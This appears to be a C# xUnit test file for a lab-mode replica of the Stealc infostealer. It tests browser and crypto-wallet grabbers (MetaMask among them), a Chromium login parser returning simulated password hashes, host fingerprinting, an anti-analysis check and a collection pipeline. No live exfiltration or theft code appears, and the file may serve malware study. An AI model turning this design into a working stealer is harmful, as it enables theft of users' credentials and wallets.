using Stealc.Grabber.Grabbers;
using Stealc.Grabber.Parsers;
using Stealc.Grabber.Exfil;
using Stealc.Grabber.Core;
using Xunit;

namespace Stealc.Grabber.Tests;

public class BrowserGrabberTests
{
    [Fact]
    public void Scan_returns_known_browsers()
    {
        var grabber = new BrowserGrabber(labMode: true);
        var results = grabber.Scan();
        Assert.True(results.Count >= 10);
        Assert.Contains(results, b => b.BrowserName == "Google Chrome");
        Assert.Contains(results, b => b.Engine == "gecko");
    }

    [Fact]
    public void Lab_mode_finds_nothing()
    {
        var grabber = new BrowserGrabber(labMode: true);
        Assert.All(grabber.Scan(), b => Assert.False(b.Found));
    }
}

public class WalletGrabberTests
{
    [Fact]
    public void Scan_lists_desktop_and_extensions()
    {
        var grabber = new WalletGrabber(labMode: true);
        var results = grabber.Scan();
        Assert.Contains(results, w => w.Kind == "desktop");
        Assert.Contains(results, w => w.Kind == "extension");
        Assert.Contains(results, w => w.Name == "MetaMask");
    }
}

public class ChromiumParserTests
{
    [Fact]
    public void ParseLogins_returns_simulated()
    {
        var parser = new ChromiumParser();
        var logins = parser.ParseLogins("C:\\fake\\profile");
        Assert.True(logins.Count >= 2);
        Assert.All(logins, l => Assert.False(string.IsNullOrEmpty(l.PasswordHash)));
    }
}

public class PipelineTests
{
    [Fact]
    public void Pipeline_runs_in_lab_mode()
    {
        var pipeline = new Pipeline(labMode: true);
        var result = pipeline.Run();
        Assert.False(string.IsNullOrEmpty(result.Fingerprint));
        Assert.True(result.BrowsersScanned > 0);
        Assert.False(string.IsNullOrEmpty(result.LogJson));
    }
}

public class FingerprintTests
{
    [Fact]
    public void Fingerprint_is_deterministic()
    {
        var a = new Fingerprint();
        var b = new Fingerprint();
        Assert.Equal(a.ShortId, b.ShortId);
    }
}

public class AntiAnalysisTests
{
    [Fact]
    public void Check_returns_report()
    {
        var report = new AntiAnalysis().Check();
        Assert.NotNull(report.Flags);
    }
}
